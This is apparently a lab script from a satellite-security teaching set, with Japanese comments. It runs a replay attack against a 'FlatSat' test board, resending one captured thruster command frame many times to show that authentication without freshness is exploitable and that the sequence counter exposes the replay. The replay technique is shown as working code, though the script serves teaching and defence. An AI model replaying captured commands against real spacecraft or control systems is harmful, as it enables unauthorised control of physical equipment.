#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 05_replay_usb.py -- 自分では組み立てられないコマンドを、過去に送られたものを
# そのまま使い回して送る（リプレイ攻撃）。
#
# ここでは暗号は正しく動いている。そこが厄介な点である。暗号はフレーム
# （送信データのひとまとまり）が鍵の持ち主から来たことを証明し、実際にそうである。
# 証明しないのは、そのフレームが「新しい」こと（鮮度）だ。鮮度は別の性質で、別の
# 仕組みが要る。改ざん検出の対象範囲の中に置いたカウンタと、値が巻き戻ることを
# 拒否する受信側である。
#
# 鍵もコマンド表も要らない。必要なのは通信の記録（キャプチャ）だけである。
#
# 期待される結果: 1 回のキャプチャから同じ状態変化が 2 回起き、シーケンス
# カウンタ（送信ごとの通し番号）から攻撃が露見する。

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, TC_GET_STATUS, TC_SET_THRUSTER,  # noqa: E402
                     build_tc, frame, hexdump)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--power", type=int, default=0x80)
    ap.add_argument("--times", type=int, default=10,
                    help="how many extra times to resend the same bytes")
    ap.add_argument("--seq", type=int, default=41)
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()

    # オペレーター（正規の運用者）が送ったはずのフレーム。1 回だけ組み立て、
    # 以降は記録したデータとして扱う。ここから先は中身を解釈しないバイト列として扱い、
    # 何も変えずに再送するだけである。
    captured = build_tc(TC_SET_THRUSTER, bytes([0, args.power & 0xFF]),
                        seq=args.seq, encrypt=not args.cleartext)

    print("[*] the captured frame, byte for byte:")
    print(hexdump(captured))
    print("[*] from here on it is opaque. No key is used and none is needed.")

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. state before ===")
        fsat.send(TC_GET_STATUS, b"", seq=1, listen=1.2)

        print("\n=== 2. the operator's command, as recorded ===")
        fsat.send_raw(captured, listen=1.0)

        print("\n=== 3. put the board back, so the second effect is unambiguous ===")
        fsat.send(TC_SET_THRUSTER, bytes([0, 0]), seq=2, listen=1.0)

        print("\n=== 4. the same bytes again. Nothing was rebuilt ===")
        fsat.send_raw(captured, listen=1.0)
        fsat.send(TC_GET_STATUS, b"", seq=3, listen=1.2)

        print(f"\n=== 5. and {args.times} more times. Watch the sequence count ===")
        for i in range(args.times):
            fsat.send_raw(captured, listen=0.25)
            time.sleep(0.05)
        fsat.send(TC_GET_STATUS, b"", seq=4, listen=1.2)

    print("\nThe counter never moved, because the frame never changed. That is "
          "the whole detection,\nand it is why the counter has to live inside "
          "the authenticated region: outside it, the attacker edits it.")
    print("\nWhat the sensor should have shown: the same bytes twice, and a "
          "sequence counter that went backwards.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
